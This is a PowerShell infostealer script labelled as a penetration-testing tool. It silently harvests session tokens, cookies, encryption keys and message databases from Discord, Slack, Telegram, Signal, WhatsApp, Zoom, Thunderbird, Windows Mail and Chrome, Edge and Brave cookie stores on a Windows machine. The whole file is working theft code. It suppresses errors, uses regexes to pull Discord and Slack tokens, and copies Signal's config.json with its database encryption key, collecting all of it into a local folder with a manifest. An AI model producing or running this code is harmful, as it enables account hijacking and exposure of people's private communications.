<#
============================================================================
  FLLC — COMMUNICATIONS DATA HARVESTER v1.777
  ═════════════════════════════════════════════
  
  Extracts messaging data, tokens, session info from:
    ■ Microsoft Teams (desktop + new Teams)
    ■ Slack Desktop
    ■ Discord Desktop
    ■ Telegram Desktop
    ■ Signal Desktop
    ■ WhatsApp Desktop
    ■ Zoom
    ■ Skype
    ■ Element / Matrix
    ■ Thunderbird / Outlook profiles
    ■ Browser-based webmail sessions (Gmail, Outlook.com, Yahoo)
  
  FLLC 2026 | Authorized penetration testing only.
============================================================================
#>

param(
    [string]$OutputDir = "$PSScriptRoot\..\..\collected\comms",
    [switch]$Silent = $true
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$logFile = Join-Path $OutputDir "comms_harvest_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
function CmLog($m) { Add-Content $logFile "[$(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 }

CmLog "=== FLLC Comms Harvester v1.777 Started ==="

# ══════════════════════════════════════════════════════════════════════════
#  DISCORD
# ══════════════════════════════════════════════════════════════════════════

$discordDir = Join-Path $OutputDir "discord"
New-Item -ItemType Directory -Path $discordDir -Force | Out-Null

$discordPaths = @{
    "Discord"        = "$env:APPDATA\discord"
    "DiscordCanary"  = "$env:APPDATA\discordcanary"
    "DiscordPTB"     = "$env:APPDATA\discordptb"
    "DiscordDev"     = "$env:APPDATA\discorddevelopment"
    "BetterDiscord"  = "$env:APPDATA\BetterDiscord"
}

foreach ($name in $discordPaths.Keys) {
    $base = $discordPaths[$name]
    if (-not (Test-Path $base)) { continue }
    
    $dest = Join-Path $discordDir $name
    New-Item -ItemType Directory -Path $dest -Force | Out-Null
    
    # Token extraction from Local Storage leveldb
    $lsPath = "$base\Local Storage\leveldb"
    if (Test-Path $lsPath) {
        Get-ChildItem $lsPath -File -Filter "*.ldb" | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $dest $_.Name) -Force 2>$null
        }
        Get-ChildItem $lsPath -File -Filter "*.log" | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $dest $_.Name) -Force 2>$null
        }
    }
    
    # Session storage
    $ssPath = "$base\Session Storage"
    if (Test-Path $ssPath) {
        Get-ChildItem $ssPath -File | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $dest "ss_$($_.Name)") -Force 2>$null
        }
    }
    
    # Cookies
    $cookiePath = "$base\Cookies"
    if (Test-Path $cookiePath) {
        Copy-Item $cookiePath (Join-Path $dest "Cookies") -Force 2>$null
    }
    
    # Search for tokens in leveldb files
    try {
        $tokenPatterns = @(
            '[\w-]{24}\.[\w-]{6}\.[\w-]{27}',          # User token
            'mfa\.[\w-]{84}',                             # MFA token
            '[\w-]{24}\.[\w-]{6}\.[\w-]{38}'             # Bot token
        )
        $allContent = Get-ChildItem $lsPath -File -ErrorAction SilentlyContinue | ForEach-Object {
            Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
        }
        $foundTokens = @()
        foreach ($pattern in $tokenPatterns) {
            $matches = [regex]::Matches(($allContent -join ''), $pattern)
            $foundTokens += $matches.Value
        }
        if ($foundTokens.Count -gt 0) {
            $foundTokens | Sort-Object -Unique | Out-File "$dest\tokens.txt" -Encoding UTF8
            CmLog "Discord: $($foundTokens.Count) tokens found in $name"
        }
    } catch {}
    
    CmLog "Discord: $name data captured"
}

# ══════════════════════════════════════════════════════════════════════════
#  SLACK
# ══════════════════════════════════════════════════════════════════════════

$slackDir = Join-Path $OutputDir "slack"
New-Item -ItemType Directory -Path $slackDir -Force | Out-Null

$slackPaths = @(
    "$env:APPDATA\Slack",
    "$env:LOCALAPPDATA\slack"
)

foreach ($sp in $slackPaths) {
    if (-not (Test-Path $sp)) { continue }
    
    # Cookies
    $cookiePath = "$sp\Cookies"
    if (Test-Path $cookiePath) {
        Copy-Item $cookiePath (Join-Path $slackDir "Cookies") -Force 2>$null
    }
    
    # Local Storage
    $lsPath = "$sp\Local Storage\leveldb"
    if (Test-Path $lsPath) {
        Get-ChildItem $lsPath -File | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $slackDir "ls_$($_.Name)") -Force 2>$null
        }
    }
    
    # Storage directory (workspace tokens)
    $storagePath = "$sp\storage"
    if (Test-Path $storagePath) {
        Get-ChildItem $storagePath -File | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $slackDir "storage_$($_.Name)") -Force 2>$null
        }
    }
    
    # Extract workspace tokens from leveldb
    try {
        $slackContent = Get-ChildItem "$sp\Local Storage\leveldb" -File -ErrorAction SilentlyContinue | ForEach-Object {
            Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
        }
        $slackTokens = [regex]::Matches(($slackContent -join ''), 'xoxc-[\w-]+|xoxb-[\w-]+|xoxp-[\w-]+|xoxs-[\w-]+|xoxa-[\w-]+')
        if ($slackTokens.Count -gt 0) {
            $slackTokens.Value | Sort-Object -Unique | Out-File "$slackDir\tokens.txt" -Encoding UTF8
            CmLog "Slack: $($slackTokens.Count) tokens extracted"
        }
    } catch {}
    
    CmLog "Slack: Data captured from $sp"
}

# ══════════════════════════════════════════════════════════════════════════
#  TELEGRAM DESKTOP
# ══════════════════════════════════════════════════════════════════════════

$telegramDir = Join-Path $OutputDir "telegram"
New-Item -ItemType Directory -Path $telegramDir -Force | Out-Null

$tgPaths = @(
    "$env:APPDATA\Telegram Desktop\tdata",
    "$env:APPDATA\Telegram Desktop"
)

foreach ($tgp in $tgPaths) {
    if (-not (Test-Path $tgp)) { continue }
    
    # Key data files (session data)
    $keyFiles = @('key_data','D877F783D5D3EF8C','map0','map1','configs','user_data')
    foreach ($kf in $keyFiles) {
        $path = "$tgp\$kf"
        if (Test-Path $path) {
            if ((Get-Item $path).PSIsContainer) {
                $destSub = Join-Path $telegramDir $kf
                New-Item -ItemType Directory -Path $destSub -Force | Out-Null
                Get-ChildItem $path -File | Select-Object -First 50 | ForEach-Object {
                    Copy-Item $_.FullName (Join-Path $destSub $_.Name) -Force 2>$null
                }
            } else {
                Copy-Item $path (Join-Path $telegramDir $kf) -Force 2>$null
            }
        }
    }
    
    # D877F783D5D3EF8C* directories (session data)
    Get-ChildItem $tgp -Directory -Filter "D877F783*" | ForEach-Object {
        $destSub = Join-Path $telegramDir $_.Name
        New-Item -ItemType Directory -Path $destSub -Force | Out-Null
        Get-ChildItem $_.FullName -File | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $destSub $_.Name) -Force 2>$null
        }
    }
    
    CmLog "Telegram: Session data captured"
}

# ══════════════════════════════════════════════════════════════════════════
#  SIGNAL DESKTOP
# ══════════════════════════════════════════════════════════════════════════

$signalDir = Join-Path $OutputDir "signal"
New-Item -ItemType Directory -Path $signalDir -Force | Out-Null

$signalBase = "$env:APPDATA\Signal"
if (Test-Path $signalBase) {
    # Config with encryption key
    $signalConfig = "$signalBase\config.json"
    if (Test-Path $signalConfig) {
        Copy-Item $signalConfig (Join-Path $signalDir "config.json") -Force 2>$null
        CmLog "Signal: Config (contains encryption key)"
    }
    
    # SQL database (encrypted with key from config)
    $signalDb = "$signalBase\sql\db.sqlite"
    if (Test-Path $signalDb) {
        Copy-Item $signalDb (Join-Path $signalDir "db.sqlite") -Force 2>$null
        CmLog "Signal: Database captured"
    }
    
    # Attachments
    $signalAttach = "$signalBase\attachments.noindex"
    if (Test-Path $signalAttach) {
        $attachCount = (Get-ChildItem $signalAttach -Recurse -File | Measure-Object).Count
        CmLog "Signal: $attachCount attachments found (not copied - too large)"
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  WHATSAPP DESKTOP
# ══════════════════════════════════════════════════════════════════════════

$waDir = Join-Path $OutputDir "whatsapp"
New-Item -ItemType Directory -Path $waDir -Force | Out-Null

$waPaths = @(
    "$env:LOCALAPPDATA\Packages\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\LocalState",
    "$env:APPDATA\WhatsApp"
)

foreach ($wap in $waPaths) {
    if (-not (Test-Path $wap)) { continue }
    
    # Local Storage
    $lsPath = "$wap\Local Storage\leveldb"
    if (Test-Path $lsPath) {
        Get-ChildItem $lsPath -File | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $waDir "ls_$($_.Name)") -Force 2>$null
        }
    }
    
    # IndexedDB
    $idbPath = "$wap\IndexedDB"
    if (Test-Path $idbPath) {
        Get-ChildItem $idbPath -Recurse -File | Select-Object -First 50 | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $waDir "idb_$($_.Name)") -Force 2>$null
        }
    }
    
    # Databases
    Get-ChildItem $wap -File -Filter "*.db" | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $waDir $_.Name) -Force 2>$null
    }
    
    CmLog "WhatsApp: Data captured from $wap"
}

# ══════════════════════════════════════════════════════════════════════════
#  ZOOM
# ══════════════════════════════════════════════════════════════════════════

$zoomDir = Join-Path $OutputDir "zoom"
New-Item -ItemType Directory -Path $zoomDir -Force | Out-Null

$zoomBase = "$env:APPDATA\Zoom"
if (Test-Path $zoomBase) {
    # Configuration
    Get-ChildItem $zoomBase -File -Filter "*.ini" | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $zoomDir $_.Name) -Force 2>$null
    }
    
    # Chat databases
    $zoomData = "$zoomBase\data"
    if (Test-Path $zoomData) {
        Get-ChildItem $zoomData -Recurse -File -Filter "*.db" | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $zoomDir "zoom_$($_.Name)") -Force 2>$null
        }
        Get-ChildItem $zoomData -Recurse -File -Filter "*.sqlite" | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $zoomDir "zoom_$($_.Name)") -Force 2>$null
        }
    }
    
    CmLog "Zoom: Data captured"
}

# ══════════════════════════════════════════════════════════════════════════
#  EMAIL CLIENTS
# ══════════════════════════════════════════════════════════════════════════

$emailDir = Join-Path $OutputDir "email"
New-Item -ItemType Directory -Path $emailDir -Force | Out-Null

# Thunderbird profiles
$tbProfiles = "$env:APPDATA\Thunderbird\Profiles"
if (Test-Path $tbProfiles) {
    Get-ChildItem $tbProfiles -Directory | ForEach-Object {
        $profDir = $_.FullName
        foreach ($f in @('logins.json','key4.db','cert9.db','prefs.js','abook.mab','history.mab','signons.sqlite')) {
            if (Test-Path "$profDir\$f") {
                Copy-Item "$profDir\$f" (Join-Path $emailDir "tb_$($_.Name)_$f") -Force 2>$null
            }
        }
    }
    CmLog "Email: Thunderbird profiles captured"
}

# Outlook PST/OST files
$outlookDataPaths = @(
    "$env:LOCALAPPDATA\Microsoft\Outlook",
    "$env:USERPROFILE\Documents\Outlook Files"
)
$pstFiles = @()
foreach ($odp in $outlookDataPaths) {
    if (Test-Path $odp) {
        Get-ChildItem $odp -File -Include "*.pst","*.ost" -Recurse | ForEach-Object {
            $pstFiles += @{
                path = $_.FullName
                size_mb = [math]::Round($_.Length / 1MB, 1)
                modified = $_.LastWriteTime.ToString()
            }
        }
    }
}
if ($pstFiles.Count -gt 0) {
    $pstFiles | ConvertTo-Json -Depth 3 | Out-File "$emailDir\outlook_data_files.json" -Encoding UTF8
    CmLog "Email: $($pstFiles.Count) Outlook PST/OST files found"
}

# Windows Mail app data
$winMailPath = "$env:LOCALAPPDATA\Comms\Unistore\data"
if (Test-Path $winMailPath) {
    Get-ChildItem $winMailPath -File | Select-Object -First 20 | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $emailDir "winmail_$($_.Name)") -Force 2>$null
    }
    CmLog "Email: Windows Mail data captured"
}

# ══════════════════════════════════════════════════════════════════════════
#  BROWSER WEBMAIL SESSION COOKIES
# ══════════════════════════════════════════════════════════════════════════

$webmailDir = Join-Path $OutputDir "webmail_sessions"
New-Item -ItemType Directory -Path $webmailDir -Force | Out-Null

# Extract browser cookies databases (already copied by other harvesters, 
# but we note which webmail services have active sessions)
$browserProfiles = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"
}

foreach ($browser in $browserProfiles.Keys) {
    $cookieDb = $browserProfiles[$browser]
    if (Test-Path $cookieDb) {
        Copy-Item $cookieDb (Join-Path $webmailDir "${browser}_Cookies") -Force 2>$null
        CmLog "Webmail: $browser cookies captured"
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  SUMMARY
# ══════════════════════════════════════════════════════════════════════════

$totalFiles = (Get-ChildItem $OutputDir -Recurse -File | Measure-Object).Count
$totalSize = [math]::Round((Get-ChildItem $OutputDir -Recurse -File | Measure-Object -Property Length -Sum).Sum / 1024, 1)

CmLog "=== COMMS HARVEST COMPLETE ==="
CmLog "Files: $totalFiles | Size: ${totalSize}KB"

@{
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    hostname = $env:COMPUTERNAME
    total_files = $totalFiles
    total_size_kb = $totalSize
    platforms = @('discord','slack','telegram','signal','whatsapp','zoom','email','webmail')
} | ConvertTo-Json | Out-File "$OutputDir\comms_manifest.json" -Encoding UTF8
